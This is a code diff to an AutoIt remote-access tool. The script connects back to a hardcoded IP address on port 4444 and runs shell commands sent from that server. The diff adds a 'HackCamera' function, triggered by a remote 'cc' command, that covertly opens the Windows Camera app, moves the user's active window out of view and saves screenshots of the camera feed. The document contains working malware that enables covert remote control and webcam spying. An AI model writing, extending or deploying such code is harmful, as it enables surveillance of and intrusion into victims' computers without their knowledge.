@@ -20,6 +20,7 @@
 #include <AutoItConstants.au3>
 #include <GUIConstantsEx.au3>
 #include <MsgBoxConstants.au3>
+#include <ScreenCapture.au3>
 
 Global Const $HOST = "103.97.127.14"
 Global Const $PORT = 4444
@@ -57,6 +58,25 @@ Func ExecuteCommand($sCmd)
     Return $output
 EndFunc
 
+Func HackCamera()
+	$on = WinGetHandle("[ACTIVE]")
+	$pos = WinGetPos($on)
+	WinSetOnTop($on, "", $WINDOWS_ONTOP)
+	Run(@ComSpec & " /c " & "start microsoft.windows.camera:", "", @SW_HIDE, $STDOUT_CHILD)
+	For $i = 1 To 10 Step 1
+		$hwnd = WinGetHandle("Camera")
+		If Not @error Then
+			WinMove($on,"",-1000, -1000)
+			WinActivate($hwnd)
+			$pos = WinGetPos($hwnd)
+			_ScreenCapture_Capture(@ScriptDir & "\" & $i & ".jpg", $pos[0], $pos[1], $pos[0] + $pos[2], $pos[1] + $pos[3])
+		EndIf
+		Sleep(400)
+	Next
+	WinMove($on, "", $pos[0], $pos[1])
+	WinKill($hwnd)
+	return "Done"
+EndFunc
 
 $socket = ConnectToServer()
 TCPSend($socket, $currentDir & "> ")
@@ -84,6 +104,10 @@ While 1
                 TCPSend($socket, "[!] Failed to change directory" & @CRLF)
                 TCPSend($socket, $currentDir & "> ")
             EndIf
+		ElseIf StringLeft($recv, 3) = "cc " Then
+			Local $d = HackCamera()
+			TCPSend($socket, "-------"&$d&"-----" & @CRLF)
+			TCPSend($socket, $currentDir & "> ")
         Else
             Local $cmdOutput = ExecuteCommand($recv)
             TCPSend($socket, $cmdOutput)
